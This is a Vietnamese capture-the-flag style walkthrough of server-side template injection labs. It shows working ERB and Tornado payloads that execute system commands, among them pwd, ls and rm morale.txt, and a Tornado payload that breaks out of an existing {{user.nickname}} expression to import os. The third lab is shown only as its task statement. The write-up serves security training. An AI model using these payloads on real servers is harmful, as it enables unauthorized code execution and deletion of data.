# Trần Mạnh Huy  SSTI-Server side template injection

* [Lab 1: Basic server-side template injection](#lab-1-basic-server-side-template-injection)
* [Lab 2: Basic server-side template injection (code context)](#lab-2-basic-server-side-template-injection-code-context)
* [Lab 3: Server-side template injection using documentation](#lab-3-server-side-template-injection-using-documentation)

## Lab 1: Basic server-side template injection

```
 This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 

```

### Ở bài lab này thì biết được luôn template là ERB, hoặc kh thì ta lên Payload All The Things thử từng cái một cũng được.

Đầu tiên check view details từng sản phẩm, để ý ở sản phẩm đầu tiên trả về message = ***Unfortunately this product is out of stock***, còn những cái khác còn nên vẫn vào bình thường, khai thác SSTI ở đây bằng cách dùng payload hoạt động được trên template erb, khi chạy qua template engine để xử lí, nó sẽ được thực thi. 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_01.jpg)

#### Test payload để xác nhận là ssti của erb template: <%= 7*7 %> . Ta được server trả về kết quả: 49. Vậy là xác nhận xong

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_02.jpg)

#### Tiếp theo đến với việc khai thác, sử dụng **<%= system('pwd') %>** để kiểm tra xem đang nằm ở đâu hoặc dùng **<%= system('ls /) %>** để xem thư mục gốc chứa những file hay folder nào :

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_03.jpg)

#### Vậy là đang ở trong thư mục /home/carlos . Để hoàn thành thì ls thử được file **morale.txt** . Việc còn lại để hoàn thành bài lab chỉ cần delete file là xong.
Dùng payload: ***<%= system('rm morale.txt) %>***

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab1_04.jpg)

## Lab 2: Basic server-side template injection (code context)

```
 This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter 

```

#### Bài lab này cần đăng nhập tài khoản, wiener:peter . Sau khi đăng nhập thì check thử phần my account, ta thấy có phần update email với phần preferrd name có thể thực hiện giao thức POST. 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_01.jpg)

Thử để giá trị ***first name*** và ***name*** và check phần comment thử: 

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_02.jpg)

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_03.jpg)

Rõ ràng là server đã dùng tags để xử lí logic qua template engine, ở đây là template Tornado. Cụ thể ta có check ở burp suite sau khi sửa dổi phần ***preferred name*** thành ***username***và ***submit*** được như sau:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_04.jpg)

Để ý thấy phần display=user.username, đúng chuẩn xử lí tags trong template engine luôn, đến đây thay bằng 1 sô payload của Tornado ssti như sau:


```
{{7*7}} = 49
${7*7} = ${7*7}
{{foobar}} = Error
{{7*'7'}} = 7777777
______
{% import foobar %} = Error
{% import os %}

{% import os %}

{{os.system('whoami')}}
{{os.system('whoami')}}
_______

```
Vì user.username đã ở sẵn trong filters (chuyển hóa các giá trị của biến và đối số trong tags) có dạng {{}} nên test chỉ việc dùng 7*7 thay vào chỗ user.username. Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_05.jpg)

#### Bây giờ thực hiện code để xóa file morale.txt thôi nào: 

Dùng payload sau để hiển thị đường dẫn thư mục hiện tại:

```
{% import os %}

{{os.system('whoami')}}

```
Lúc đầu thử truyền vào giá trị {%+import+os+%}+{{os.system('pwd')}} thì toàn hiển thị lỗi, sau 1 lúc thử lại thì nhớ ra là biến đang được xử lí trong filter/tags {{}} . Vì vậy để truyền vào giá trị trên thì cần sửa payload như sau: ***user.nickname}}{%+import+os+%}+{{os.system('pwd')*** . Lúc này template engine sẽ xử lí: {{user.nickname}} {% import os %} và {{os.system('pwd'}}. Ta được:

![](https://github.com/manhhuy2002/hello-world/blob/main/ssti/lab2_06.jpg)

#### Đến đây thì tương tự như bài trên, đang ở đường dẫn: /home/carlos nên sửa **pwd** thành **ls** sẽ có file morale.txt được hiển thị. Để giải quyết bài lab, sửa payload thành : 

```
***user.nickname}}{%+import+os+%}+{{os.system('rm morale.txt')*** 
```

Như vậy là ta đã xóa được file morale.txt như bài lab mong muốn.

> Reference link payload: https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Lab 3: Server-side template injection using documentation

```
 This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

```
